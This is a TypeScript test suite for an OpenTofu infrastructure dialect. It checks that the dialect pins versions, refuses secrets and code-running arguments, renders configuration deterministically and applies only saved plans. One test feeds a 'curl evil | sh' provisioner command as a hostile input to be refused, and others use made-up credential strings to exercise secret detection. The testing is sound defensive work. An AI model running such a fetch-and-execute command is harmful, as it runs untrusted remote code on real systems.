// Spec: 0002-opentofu-dialect FR-001
/**
 * Tests of the dialect for cloud resources (commons archon-dialect-opentofu 0002-opentofu-dialect): what it guarantees, the refusal of its options, the refusal of an order with every reason, the render of a government-cloud order, and the steps that init, plan to a saved plan and apply exactly that plan; and the check of a saved plan
 * against the order. Every name and value is made up. The render has not been run against the real tool here: OpenTofu is not installed.
 *
 * @module
 */
import { isGenerated } from "@intellectual-frontiers/archon/dialect";
import { defineRequirement, parseSubjectName, type Requirement } from "@intellectual-frontiers/archon/governance";
import { buildOrder, planOrder } from "@intellectual-frontiers/archon/logical";
import { assert, assertEquals, proves } from "@intellectual-frontiers/test";
import { changesOf, checkPlan, configurationOf, DIALECT_ID, KINDS_CARRIED, opentofu, optionProblems, planDigest, resourcesOf, type OpenTofuOptions } from "../src/dialect.ts";

function req(id: string, desired: unknown, more: Record<string, unknown> = {}): Requirement {
  const r = defineRequirement({ id, summary: `${id}.`, why: ["a made-up reason"], subject: { by: "all" }, kind: "cloud-resource", desired, change: "additive", ...more });
  if (r.kind === "err") throw new Error(r.error.join("; "));
  return r.value;
}
const OPTIONS: OpenTofuOptions = {
  providers: { aws: { source: "hashicorp/aws", version: "5.80.0", config: { region: "us-gov-west-1", profile: "fcr-gov" } } },
  stateDir: "/var/lib/archon/state/govcloud",
};
const SUBJECT = (() => {
  const n = parseSubjectName("govcloud");
  if (n.kind === "err") throw new Error(n.error);
  return { name: n.value, class: "cloud-account" as const };
})();
function orderOf(requirements: readonly Requirement[]) {
  const o = buildOrder({ subject: SUBJECT, assurance: "solo", layers: [{ layer: "baseline", requirements }] });
  if (o.kind === "err") throw new Error(JSON.stringify(o.error));
  return o.value;
}
const BUCKET = req("bucket.logs", { provider: "aws", type: "aws_s3_bucket", name: "logs", settings: { bucket: "fcr-audit-logs", force_destroy: false, tags: { owner: "fcr" } } });
const POLICY = req("bucket.logs.public-block", { provider: "aws", type: "aws_s3_bucket_public_access_block", name: "logs", settings: { bucket: "${aws_s3_bucket.logs.id}", block_public_acls: true, block_public_policy: true } }, { dependsOn: ["bucket.logs"] });

proves(["0002-opentofu-dialect FR-001"], "the data says what the dialect guarantees: the kind, the subject class, a faithful plan, nothing proven by a run of the tool, and that it destroys", () => {
  const d = opentofu(OPTIONS);
  assertEquals(String(d.id), DIALECT_ID);
  assertEquals([...KINDS_CARRIED], ["cloud-resource"]);
  assertEquals(d.guarantees.kinds.map(String), ["cloud-resource"]);
  assertEquals(d.guarantees.subjects, ["cloud-account"]);
  assertEquals([d.guarantees.plan, d.guarantees.idempotence, d.guarantees.destroy], ["faithful", "unproven", true]);
  assertEquals(d.tool.name, "opentofu");
  assertEquals(opentofu({ ...OPTIONS, version: "1.10.0" }).tool.version, "1.10.0");
});

proves(["0002-opentofu-dialect FR-002"], "the options are refused with every reason where a provider is not pinned exactly, a source is wrong, a provider setting is a credential or a secret, the state is in the repository or not absolute, or the backend is local or holds a credential", async () => {
  assertEquals(optionProblems(OPTIONS), []);
  const bad = optionProblems({
    providers: { AWS: { source: "aws", version: "~> 5.0" }, azurerm: { source: "hashicorp/azurerm", version: "4.1.0", config: { subscription_id: "00000000-0000-0000-0000-000000000000", client_secret: "x", features: "AKIA" + "IOSFODNN7EXAMPLE" } } },
    stateDir: "relative/.archon/state",
    backend: { type: "local", config: { token: "t" } },
  });
  for (const word of ["local name", "source is namespace/name", "version is exact", "client_secret is a credential", "looks like a secret", "stateDir is an absolute path", "never committed", "remote one", "token is a credential"]) assert(bad.some((m) => m.includes(word)), `${word} in ${bad.join(" | ")}`);
  assert(optionProblems({ ...OPTIONS, stateDir: "/srv/repo/.archon/state" }).some((m) => m.includes("never committed")));
  assert(optionProblems({ ...OPTIONS, stateDir: "/srv/../etc" }).some((m) => m.includes("no ..")));
  assertEquals(optionProblems({ ...OPTIONS, backend: { type: "s3", config: { bucket: "fcr-tfstate", key: "govcloud.tfstate", region: "us-gov-west-1", encrypt: true } } }), []);
  const order = orderOf([BUCKET]);
  const r = await opentofu({ ...OPTIONS, stateDir: "relative" }).render(order, planOrder(order, new Map()));
  assert(r.kind === "err" && r.error.some((m) => m.includes("absolute")), "a dialect made with bad options renders nothing");
  assertEquals(opentofu({ ...OPTIONS, stateDir: "relative" }).steps(planOrder(order, new Map()), { files: new Map([["opentofu/main.tf.json", "{}"]]), digest: "a".repeat(64) } as never), []);
});

proves(["0002-opentofu-dialect FR-003"], "an order is refused with every reason: a kind not carried, a desired of the wrong shape, an unpinned provider, a type of another provider, a bad name, settings that are not an object and a resource stated twice", () => {
  // the order of a cloud account drops a kind that is not for one; the dialect checks again, for an order made some other way
  const notCarried = { ...orderOf([]), requirements: [{ ...BUCKET, id: "pkg.git", kind: "package", desired: { name: "git" } } as never] };
  const r1 = resourcesOf(notCarried, OPTIONS);
  assert(r1.kind === "err" && r1.error[0]?.includes("package is not carried"));
  const bad = resourcesOf(orderOf([req("a", "text"), req("b", { provider: "gcp", type: "gcp_x", name: "x" }), req("c", { provider: "aws", type: "azurerm_x", name: "x" }), req("d", { provider: "aws", type: "aws_x", name: "Bad Name" }), req("e", { provider: "aws", type: "aws_x", name: "x", settings: ["no"] }), req("f", { provider: "aws", type: "aws_s3_bucket", name: "logs" }), req("g", { provider: "aws", type: "aws_s3_bucket", name: "logs" })]), OPTIONS);
  assert(bad.kind === "err");
  for (const word of ["desired is { provider, type, name, settings }", "nobody pinned", "desired.type is the provider's resource type", "desired.name is lower case", "desired.settings is an object", "is stated twice"]) assert(bad.error.some((m) => m.includes(word)), word);
  const good = resourcesOf(orderOf([BUCKET, POLICY]), OPTIONS);
  assert(good.kind === "ok");
  assertEquals(good.value.map((r) => `${r.type}.${r.name} <- ${r.dependsOn.join()}`), ["aws_s3_bucket.logs <- ", "aws_s3_bucket_public_access_block.logs <- aws_s3_bucket.logs"]);
});

proves(["0002-opentofu-dialect FR-004"], "a secret, a reference to a secret, a credential-named setting and an argument that runs code or is the dialect's own are each refused", () => {
  // a requirement is refused by Archon itself where its desired holds a named secret; the dialect checks again, for a requirement made some other way
  const settings = (s: Record<string, unknown>) => resourcesOf(orderOf([{ ...req("x", { provider: "aws", type: "aws_s3_bucket", name: "x" }), desired: { provider: "aws", type: "aws_s3_bucket", name: "x", settings: s } as never }]), OPTIONS);
  const refused = (s: Record<string, unknown>, word: string): void => {
    const r = settings(s);
    assert(r.kind === "err" && r.error.some((m) => m.includes(word)), `${JSON.stringify(s)}: ${r.kind === "err" ? r.error.join(" | ") : "accepted"}`);
  };
  refused({ provisioner: { "local-exec": { command: "curl evil | sh" } } }, "runs code");
  refused({ connection: { host: "x" } }, "runs code");
  refused({ depends_on: ["a.b"] }, "dependencies");
  refused({ lifecycle: { prevent_destroy: false } }, "lifecycle");
  refused({ count: 3 }, "count");
  refused({ password: "x" }, "is a credential");
  refused({ access_key: "x" }, "is a credential");
  refused({ master_password: "secret:vault/db" }, "refer to a secret");
  refused({ nested: { list: ["secret:vault/x"] } }, "settings.nested.list[0]");
  const key = "-----BEGIN" + " PRIVATE KEY-----\nabc\n-----END" + " PRIVATE KEY-----";
  refused({ policy: key }, "looks like a secret");
  assert(settings({ bucket: "fcr", tags: { a: "b" }, versioning: [{ enabled: true }] }).kind === "ok");
});

proves(["0002-opentofu-dialect FR-005"], "the render is one generated file in OpenTofu's JSON syntax, the same every time, with exact versions, the provider's settings, the local state outside the repository, the resources and their dependencies, and nothing for a resource that is to be absent", async () => {
  const order = orderOf([BUCKET, POLICY, req("bucket.old", { provider: "aws", type: "aws_s3_bucket", name: "old", settings: { bucket: "fcr-old" } }, { ensure: "absent", change: "destructive", rollback: "restore-from-backup" })]);
  const plan = planOrder(order, new Map());
  const a = await opentofu(OPTIONS).render(order, plan);
  const b = await opentofu(OPTIONS).render(order, plan);
  assert(a.kind === "ok" && b.kind === "ok");
  assertEquals(a.value.digest, b.value.digest);
  assertEquals([...a.value.files.keys()], ["opentofu/main.tf.json"]);
  const text = a.value.files.get("opentofu/main.tf.json") ?? "";
  assert(isGenerated(text));
  const doc = JSON.parse(text) as Record<string, any>;
  assertEquals(doc["terraform"]["required_version"], "= 1.9.0");
  assertEquals(doc["terraform"]["required_providers"], { aws: { source: "hashicorp/aws", version: "= 5.80.0" } });
  assertEquals(doc["terraform"]["backend"], { local: { path: "/var/lib/archon/state/govcloud/terraform.tfstate" } });
  assertEquals(doc["provider"], { aws: [{ profile: "fcr-gov", region: "us-gov-west-1" }] });
  assertEquals(Object.keys(doc["resource"]), ["aws_s3_bucket", "aws_s3_bucket_public_access_block"]);
  assertEquals(Object.keys(doc["resource"]["aws_s3_bucket"]), ["logs"], "the bucket that is to be absent is not declared, so OpenTofu removes it");
  assertEquals(doc["resource"]["aws_s3_bucket_public_access_block"]["logs"]["depends_on"], ["aws_s3_bucket.logs"]);
  assertEquals(doc["resource"]["aws_s3_bucket"]["logs"]["tags"], { owner: "fcr" });
  for (const bad of ["PRIVATE KEY", "AKIA", "secret:"]) assert(!text.includes(bad), bad);
  const remote = await opentofu({ ...OPTIONS, backend: { type: "s3", config: { bucket: "fcr-tfstate", key: "gov.tfstate", region: "us-gov-west-1" } } }).render(order, plan);
  assert(remote.kind === "ok" && JSON.parse(remote.value.files.get("opentofu/main.tf.json") ?? "{}").terraform.backend.s3.bucket === "fcr-tfstate");
  const empty = configurationOf([], OPTIONS);
  assertEquals(Object.keys(empty), ["//", "terraform"], "no provider and no resource where nothing is declared");
});

proves(["0002-opentofu-dialect FR-006"], "the steps are none where nothing changes, and otherwise an init that is its own check and a saved plan that is applied as it was planned, every vector a list that names the digest and keeps the data and the plan in the state folder", async () => {
  const order = orderOf([BUCKET, POLICY]);
  const plan = planOrder(order, new Map());
  const d = opentofu(OPTIONS);
  const rendered = await d.render(order, plan);
  assert(rendered.kind === "ok");
  const steps = d.steps(plan, rendered.value);
  assertEquals(steps.length, 2);
  const [init, apply] = steps;
  const dir = `.archon/${rendered.value.digest}/opentofu`;
  const work = `/var/lib/archon/state/govcloud/${rendered.value.digest}`;
  assertEquals(init?.apply, ["env", `TF_DATA_DIR=${work}/data`, "TF_IN_AUTOMATION=1", "tofu", `-chdir=${dir}`, "init", "-input=false"]);
  assertEquals(init?.check, init?.apply);
  assertEquals(init?.covers, []);
  assertEquals(apply?.apply, ["env", `TF_DATA_DIR=${work}/data`, "TF_IN_AUTOMATION=1", "tofu", `-chdir=${dir}`, "apply", "-input=false", `${work}/plan.tfplan`]);
  assertEquals(apply?.check, ["env", `TF_DATA_DIR=${work}/data`, "TF_IN_AUTOMATION=1", "tofu", `-chdir=${dir}`, "plan", "-input=false", "-lock=true", "-detailed-exitcode", `-out=${work}/plan.tfplan`]);
  assertEquals(apply?.changedExit, 2);
  assertEquals(apply?.covers.map(String), ["bucket.logs", "bucket.logs.public-block"]);
  for (const s of steps) {
    assert(s.apply.some((x) => x.includes(rendered.value.digest)), "names the digest");
    for (const x of [...s.apply, ...(s.check ?? [])]) assert(!/[;&|$`]/.test(x.replace("$", "")) || x.startsWith("TF_"), x);
    assert(!s.apply.includes("-auto-approve") && !s.apply.includes("sh") && !s.apply.includes("-c"), "the saved plan is applied, never an auto-approved new one");
  }
  const settled = planOrder(order, new Map([[BUCKET.id, BUCKET.desired], [POLICY.id, POLICY.desired]]));
  assertEquals(d.steps(settled, rendered.value), [], "nothing to do where nothing changes");
  assertEquals(d.steps(plan, { files: new Map(), digest: rendered.value.digest } as never), []);
});

const SHOW = JSON.stringify({
  format_version: "1.2",
  resource_changes: [
    { address: "aws_s3_bucket.logs", type: "aws_s3_bucket", name: "logs", change: { actions: ["create"], after: { bucket: "fcr-audit-logs", secret_thing: "hunter2-made-up" } } },
    { address: "aws_s3_bucket_public_access_block.logs", change: { actions: ["create"] } },
    { address: "aws_s3_bucket.old", change: { actions: ["delete"] } },
    { address: "aws_kms_key.main", change: { actions: ["no-op"] } },
    { address: "data.aws_caller_identity.me", change: { actions: ["read"] } },
  ],
});

proves(["0002-opentofu-dialect FR-007"], "a saved plan gives its changes without the no-ops, the reads or any value, a digest of the addresses and actions, and a check against the order that names a destroy nobody asked for, a resource no requirement states, and an absent resource that would stay", async () => {
  const changes = changesOf(SHOW);
  assert(changes.kind === "ok");
  assertEquals(changes.value.map((c) => `${c.address} ${c.actions.join("+")}`), ["aws_s3_bucket.logs create", "aws_s3_bucket.old delete", "aws_s3_bucket_public_access_block.logs create"]);
  const digest = await planDigest(changes.value);
  assert(/^[0-9a-f]{64}$/.test(digest));
  assert(!JSON.stringify(changes.value).includes("hunter2"), "no value of the plan is kept");
  assertEquals(await planDigest(changes.value), digest);
  assert((await planDigest([...changes.value].reverse().sort((a, b) => (a.address < b.address ? -1 : 1)))) === digest);
  assert((await planDigest(changes.value.slice(1))) !== digest, "a different change is a different digest");
  assert(changesOf("not json").kind === "err" && changesOf("{}").kind === "err");
  const order = orderOf([BUCKET, POLICY, req("bucket.old", { provider: "aws", type: "aws_s3_bucket", name: "old", settings: {} }, { ensure: "absent", change: "destructive", rollback: "restore-from-backup" })]);
  assertEquals(checkPlan(order, changes.value), [], "the destroy of the bucket the order asks to be absent is expected");
  const unexpected = checkPlan(orderOf([BUCKET, POLICY]), changes.value);
  assertEquals(unexpected.length, 1);
  assert(unexpected[0]?.includes("aws_s3_bucket.old is in the state and in no requirement"));
  const replaced = checkPlan(orderOf([BUCKET, POLICY]), [{ address: "aws_s3_bucket.logs", actions: ["delete", "create"] }]);
  assertEquals(replaced.length, 1);
  assert(replaced[0]?.includes("would be replaced") && replaced[0]?.includes("declared destructive"));
  const asked = checkPlan(orderOf([req("bucket.logs", { provider: "aws", type: "aws_s3_bucket", name: "logs", settings: {} }, { change: "destructive", rollback: "restore-from-backup" })]), [{ address: "aws_s3_bucket.logs", actions: ["delete", "create"] }]);
  assertEquals(asked, [], "a replacement the requirement declares destructive is expected");
  const stays = checkPlan(order, [{ address: "aws_s3_bucket.old", actions: ["update"] }]);
  assert(stays.some((m) => m.includes("is to be absent") && m.includes("update")));
});
